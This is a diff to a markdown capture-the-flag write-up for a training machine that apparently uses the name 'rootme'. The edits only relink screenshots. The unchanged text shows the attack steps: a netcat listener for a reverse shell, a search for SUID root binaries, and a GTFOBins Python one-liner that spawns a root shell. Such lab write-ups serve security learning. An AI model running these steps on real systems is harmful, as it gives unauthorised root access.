@@ -79,10 +79,12 @@ we have successfully uploaded our reverse shells to the target
 Set a netcat listener on port 1234 
 command used: nc -nlvp 1234
 
-![[Pasted image 20260318155333.png]]
+![Netcat Listener Flag](images/rootme/flag%20captured.png)
+
  Now we have access as a normal user
  command used: find / -type f -name user.txt 2> /dev/null which means everything else is redirected to null
- ![[Pasted image 20260318160007.png]]
+ 
+![Flag Captured](images/rootme/flag%20captured.png)
  
  thats our flag
  
@@ -92,13 +94,13 @@ command used: find / -type f -user root -perm -u=s 2> /dev/null
 Finds files owned by root that have SUID permission
 when Set User Id files are run they run as root user
 
-![[Pasted image 20260318161710.png]]
+![Python Privilege Escalation](images/rootme/python%20privilege%20escalation.png)
 
 we can use GTFO bins to get the program python to escalate privilages
 command used: python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 "/bin/sh" gives a shell
 
-![[Pasted image 20260318163244.png]]
+![Privilege Escalation](images/rootme/privilage%20escalation.png)
 we are now root user
 command used: find / -type f -name root.txt 2> /dev/null
 
